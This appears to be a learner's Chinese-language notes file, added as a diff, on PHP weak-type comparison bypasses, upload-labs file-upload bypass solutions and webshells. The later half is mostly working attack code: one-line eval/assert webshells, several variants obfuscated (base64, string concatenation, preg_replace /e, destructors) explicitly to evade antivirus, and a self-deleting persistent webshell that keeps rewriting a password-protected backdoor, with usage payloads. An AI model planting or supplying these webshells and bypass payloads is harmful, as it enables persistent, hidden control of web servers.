@@ -1,0 +1,432 @@
+初识php以及文件上传
+php弱类型比较
+
+==是比较数值
+
+
+md4弱类型比较
+0e251288019
+
+pass-1
+
+== 是比较数值，不比较类型
+
+var_dump(998=="998"); true
+
+var_dump(998=="998ab"); true
+
+var_dump(0=="haha"); true
+
+var_dump(123===123); true
+
+
+md4 md5加密都有可能出现一个0e开头
+for($i=1;;$i++){
+    //$r = 0e1 0e2 ... 0e251288019
+    $r = "0e".$i;
+    //$md4 = 0e874956163641961271069404332409 
+    $md4 = hash("md4",$r);
+    echo '<br/>';
+    echo $i;
+    if(preg_match("/^0e[0-9]*$/", $md4)){
+        echo "md4加密前".$r;
+        echo "md4加密后".$md4;
+        break;
+    }
+}
+
+0e251288019
+
+---------------------
+pass-2
+
+md5弱类型比较
+IHKFRNS 0e256160682445802696926137988570
+QLTHNDT 0e405967825401955372549139051580
+QNKCDZO 0e830400451993494058024219903391
+3908336290 0e807624498959190415881248245271
+4011627063 0e485805687034439905938362701775
+4775635065 0e998212089946640967599450361168
+0e215962017 0e291242476940776845150308577824
+aabg7XSs 0e087386482136013740957780965295
+aabC9RqS 0e041022518165728065344349536299
+
+这些经过md5hash出来的结果都是0e开头的！！！
+
+数组绕过：
+php的md5函数，无法处理数组，返回NULL
+
+/pass-02.php?user[]=1&pass[]=2
+
+
+------------------------
+
+pass-3
+
+ctype_alpha检测A-Za-z
+is_numeric检查是否只有数字
+
+/pass-03.php?user=3908336290&pass=QNKCDZO
+
+----------------------
+
+pass-4
+
+/pass-04.php?user=&pass[]=1
+没有赋值就是空
+
+----------------------
+
+pass-5
+
+/pass-04.php?user=&pass[]=1
+
+----------------------
+
+pass-6
+
+240610708---aawBzC
+
+----------------------
+
+pass-7
+
+/pass-07.php?user[]=1&pass[]=2
+
+----------------------
+
+pass-8
+
+php特定数据类型
+NAN INF
+
+var_dump('INF'==INF);//false
+
+var_dump('INF'!==INF);//true
+
+var_dump(md5('INF')===md5(INF));//true
+
+echo '<br/>';
+echo md5('INF');
+echo '<br/>';
+echo md5(INF);
+
+POST
+auth=O:4:"auth":2:{s:4:"user";d:INF;s:4:"pass";d:INF;}
+
+>>>>
+
+文件上传
+
+前端
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>文件上传测试</title>
+</head>
+<body>
+<form action="sc.php" method="POST" enctype="multipart/form-data">
+	<label>文件名字：</label>
+	<input type="file" name="wenjian" id="file" />
+	<input type="submit" name="submit" value="提交">
+</form>
+</body>
+</html>
+
+后端
+<?php 
+
+//接收来自对方的文件
+$fileinfo = $_FILES['wenjian'];
+
+//获得文件名
+//echo $_FILES['wenjian']['name'];
+
+//echo '<br/>';
+
+//查看文件信息
+print_r($fileinfo);
+
+//获得文件名
+$filename = $fileinfo["name"];
+
+//获得文件临时路径
+$filetmp_path = $fileinfo["tmp_name"];
+
+//把图片从临时路径挪到你要的地方
+move_uploaded_file($filetmp_path, "./pic/".$filename);
+
+?>
+
+文件上传漏洞
+
+upload labs:
+1
+禁用js
+
+2
+修改Content-Type为image/jpeg
+
+3
+php3 php4 pht phtml都可以被当作php来执行
+上传haha.php3
+
+4
+（不推荐使用这个打法）
+在apache中.htaccess文件的作用是把xxxx类型的东西当作xxxx来执行
+<FilesMatch "jpg">
+SetHandler application/x-httpd-php
+</FilesMatch>
+此时会把所有文件名包含jpg的文件当作php来执行
+上传haha.jpg
+
+5
+windows系统不区分大小写
+linux严格区分大小写
+haha.PHp
+
+6.
+如果没有判断首位去空
+Windows文件系统里面haha.php  =haha.php
+
+7
+windows系统haha.php.=haha.php
+
+8
+haha.php::$DATA=haha.php
+
+9
+haha.php. .=haha.php
+
+10
+haha.phphpp
+
+11
+get的%00截断
+如果碰到%00，就会自动截断
+save_path=../upload/haha.php%00.jpg
+filename="haha.php.jpg"
+
+12
+post的%00截断
+post的数据包中，%00需要右键--convert selection--url---urldecode
+
+
+13-15
+文件包含漏洞，include函数可以把包含的所有任意文件当作php来执行
+GIF89a
+<?php phpinfo()?>
+木马上传之后，利用文件包含漏洞执行
+http://127.0.0.1/include.php?file=./upload/4920220117144104.gif
+
+文件合并制作图片木马
+copy kfc1.jpg /a + haha.php /b muma.jpg
+
+16-17
+先把文件移动到文件夹，再判断，那么说明文件有那么一瞬间肯定在，所以需要使用burp等软件进行快速提交，达到让它删不过来
+
+18
+.7z有时候也可以当作php执行
+
+19
+move_upload_file函数会忽略/.
+
+Content-Disposition: form-data; name="upload_file"; filename="haha.php"
+Content-Type: image/jpeg
+
+GIF89a
+<?php phpinfo()?>
+-----------------------------200222961522119
+Content-Disposition: form-data; name="save_name[0]"
+
+upload-20.php/
+-----------------------------200222961522119
+Content-Disposition: form-data; name="save_name[2]"
+
+jpg
+
+20
+<?php
+
+//检查MIME
+$allow_type = array('image/jpeg','image/png','image/gif');
+if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+    $msg = "禁止上传该类型文件!";
+}else{
+    //检查文件名
+    $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+    //$file数组0--upload-20.php/   1--null 2--jpg
+
+    //如果不是数组，用.来把$file变成数组，如果本来就是数组，跳过此步骤
+    if (!is_array($file)) {
+    	//文件名小写，然后用.进行分割
+        $file = explode('.', strtolower($file));
+    }
+
+    //拿到了数组的最后一个数据
+    $ext = end($file);//jpg
+    $allow_suffix = array('jpg','png','gif');
+    if (!in_array($ext, $allow_suffix)) {
+        $msg = "禁止上传该后缀文件!";
+    }else{
+    	//upload-20.php
+        $file_name = reset($file) . '.' . $file[count($file) - 1];
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = UPLOAD_PATH . '/' .$file_name;
+        if (move_uploaded_file($temp_file, $img_path)) {
+            $msg = "文件上传成功！";
+            $is_upload = true;
+        } else {
+            $msg = "文件上传失败！";
+        }
+    }
+
+
+?>
+
+备注:
+$file = array(0=>'no1',2=>'no3' );
+$file数组中有2个元素
+$file[1]的结果是null
+
+
+>>>>
+一句话木马
+eval()
+把里面的字符串当作php代码执行
+
+@报错不显示
+
+一句话木马源码（小马）
+<?php eval($_POST['cmd']); ?>
+
+访问
+http://127.0.0.1/muma.php
+POST提交cmd=phpinfo();
+
+eval("phpinfo();") eval函数会把phpinfo();这个字符串当作php名类来执行
+
+system() 里面写操作系统的命令
+
+cmd=system("mkdir 123"); 可以使用system函数取操作被入侵的系统
+
+----------------------
+
+一句话木马免杀
+
+<?php system($_POST['cmd']); ?>
+system函数执行完名类可以直接输出
+
+<?php $a=exec("mkdir nihao");echo $a; ?>
+exec一定要有东西接它
+
+<?php assert($_POST['cmd']) ?>
+assert替代eval
+
+<?php 
+$a = substr_replace("assexx", "rt", 4);
+$a($_POST['cmd']);
+?>
+
+<?php 
+function haha($a){
+  $a($_POST['cmd']);
+}
+haha(assert);
+?>
+
+<?php 
+$a = $_REQUEST['a'];
+$b = "\n";//在php里，如果需要使用\，得用""！！！！！！
+eval($b.=$a);
+?>
+
+<?php 
+
+//定义一个叫me的类
+class me
+{
+  public $a="";
+  //类被回收之前执行assert命令
+  function __destruct(){
+    assert("$this->a");
+  }
+}
+//初始化me的类
+$b = new me;
+$b->a=$_POST['a'];
+?>
+
+<?php 
+//assert的base64加密结果
+$a = base64_decode("YXNzZXJ0");
+$a($_POST['cmd']);
+
+?>
+
+<?php 
+//assert
+$a="a"."s";
+$b="s"."e"."r"."t";
+$c=$a.$b;
+$c($_POST['cmd']);
+
+?>
+
+<?php 
+function fun(){
+  return $_POST['cmd'];
+}
+//使用正则表达式来执行
+//匹配第三个参数"haha"，正则匹配的内容就是haha，如果匹配到了，替换为fun()函数，并且e（当作php来执行）
+//@不让php输出错误，增加隐蔽功能
+@preg_replace("/haha/e", fun(), "haha")
+
+?>
+
+<?php 
+if(isset($_POST['file'])){
+  $d = 'data';
+  $$d=$_POST['text']; //$data
+  $f = 'fp';
+  $$f = fopen($_POST['file'],'wb');//$fp
+  echo fwrite($fp, $data)?'save success':'fail';
+  fclose($fp);
+}
+?>
+
+<?php 
+@$a=$_POST['Hello'];
+if(isset($a)){
+  //[@eval(base64_decode($_POST[z0]));]
+  //@eval(base64_decode($_POST[z0]));
+  //\\1指的是(.*)
+  //W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=
+  @preg_replace("/\[(.*)\]/e", '\\1', base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10='));
+}
+?>
+使用方法：
+Hello=aaa&z0=cGhwaW5mbygpOw==
+
+
+
+<?php 
+//进程运行，只有把进程干掉，才可以删除我
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file="./.index.php";
+$code='<?php if(md5($_POST["pass"])=="01ddae4032e17a1c338baac9c4322b30"){@eval($_POST[a]);}';
+while(1){
+  file_put_contents($file, $code);
+  usleep(5000);
+}
+?> 
+使用方法，执行muma.php
+pass=haha123&a=phpinfo();
+
+防御方法：
+重启php服务器，可以删除
+使用竞争写入
+创建一个.index.php名字的文件夹￥——
